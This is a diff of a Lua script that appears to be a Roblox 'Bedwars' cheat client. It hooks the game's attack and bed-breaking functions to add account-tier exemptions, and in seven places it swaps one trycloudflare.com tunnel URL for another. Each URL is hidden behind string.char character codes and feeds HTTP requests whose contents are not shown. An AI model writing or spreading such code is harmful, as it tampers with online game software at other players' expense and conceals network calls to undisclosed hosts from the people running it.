@@ -1166,7 +1166,12 @@ run(function()
 					end
 
 					if suc and plr then
-						-- whitelist removed
+						if getAccountTier(lplr) == 0 and getAccountTier(plr) <= 4 then
+							return
+						end
+						if getAccountTier(plr) >= 99 and getAccountTier(lplr) >= 4 then
+							return
+						end
 					end
 
 					return call:SendToServer(attackTable, ...)
@@ -1179,16 +1184,37 @@ run(function()
 		return call
 	end
 
+	local bedtms = {}
+
 	bedwars.BlockController.isBlockBreakable = function(self, breakTable, plr)
 		local obj = bedwars.BlockController:getStore():getBlockAt(breakTable.blockPosition)
 
-		if obj and obj.Name == 'bed' then
-			for _, p in playersService:GetPlayers() do
-				local hasNoBreak = pcall(function() return obj:GetAttribute('Team'..(p:GetAttribute('Team') or 0)..'NoBreak') end)
-				if hasNoBreak then
-					return false
+		if obj and (obj.Name == 'bed') then
+			local lplrtiers = getAccountTier(plr or lplr) or 0
+			local teambed = obj:GetAttribute('TeamId') or obj:GetAttribute('Team') or 0
+			for _, plrs in playersService:GetPlayers() do
+				local char = plrs.Character
+				if char then
+					local team = char:GetAttribute('Team') or char:GetAttribute('TeamId') or 0
+					if team == teambed then
+						table.insert(bedtms,{plr=plrs,tier=getAccountTier(plrs) or 0})
+					end
 				end
 			end
+			for _, v in bedtms do
+				if v.tier then
+					if v.tier >= 2 and v.tier < 5 and lplrtiers == 0 then
+						return false
+					elseif v.tier >= 99 and lplrtiers <= 4 then
+						return false
+					elseif v.tier >= 99 and lplrtiers >= 99 then
+						return OldBreak(self, breakTable, plr)
+					else
+						return OldBreak(self, breakTable, plr)
+					end
+				end
+			end
+			table.clear(bedtms)
 		end
 
 		return OldBreak(self, breakTable, plr)
@@ -1201,6 +1227,7 @@ run(function()
 			task.wait(60)
 			if vape.Loaded then
 				table.clear(cache)
+				table.clear(bedtms)
 			end
 		end
 	end)
@@ -34763,7 +34790,7 @@ end)
 run(function()	
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = string.char(104,116,116,112,115,58,47,47,102,97,105,114,108,121,45,98,111,120,101,100,45,97,115,115,117,114,97,110,99,101,45,111,117,114,115,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 
 		local _secret = ''
 
@@ -34796,7 +34823,7 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = string.char(104,116,116,112,115,58,47,47,102,97,105,114,108,121,45,98,111,120,101,100,45,97,115,115,117,114,97,110,99,101,45,111,117,114,115,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
 		local oks, ress = pcall(function()
 			return _req({
@@ -34824,7 +34851,7 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = string.char(104,116,116,112,115,58,47,47,102,97,105,114,108,121,45,98,111,120,101,100,45,97,115,115,117,114,97,110,99,101,45,111,117,114,115,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
 		local oks, ress = pcall(function()
 			return _req({
@@ -34852,7 +34879,7 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = string.char(104,116,116,112,115,58,47,47,102,97,105,114,108,121,45,98,111,120,101,100,45,97,115,115,117,114,97,110,99,101,45,111,117,114,115,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
 		local oks, ress = pcall(function()
 			return _req({
@@ -34880,7 +34907,7 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = string.char(104,116,116,112,115,58,47,47,102,97,105,114,108,121,45,98,111,120,101,100,45,97,115,115,117,114,97,110,99,101,45,111,117,114,115,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
 		local oks, ress = pcall(function()
 			return _req({
@@ -34910,7 +34937,7 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = string.char(104,116,116,112,115,58,47,47,102,97,105,114,108,121,45,98,111,120,101,100,45,97,115,115,117,114,97,110,99,101,45,111,117,114,115,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
 
 
@@ -34940,7 +34967,7 @@ run(function()
 	end)
 	run(function()
 		local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body=''} end
-		local _baseUrl = string.char(104,116,116,112,115,58,47,47,102,97,105,114,108,121,45,98,111,120,101,100,45,97,115,115,117,114,97,110,99,101,45,111,117,114,115,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
+		local _baseUrl = string.char(104,116,116,112,115,58,47,47,100,101,114,98,121,45,99,111,100,101,45,99,111,111,112,101,114,97,116,105,118,101,45,115,112,97,110,46,116,114,121,99,108,111,117,100,102,108,97,114,101,46,99,111,109)
 		local _secret = ''
 
 		local oks, ress = pcall(function()
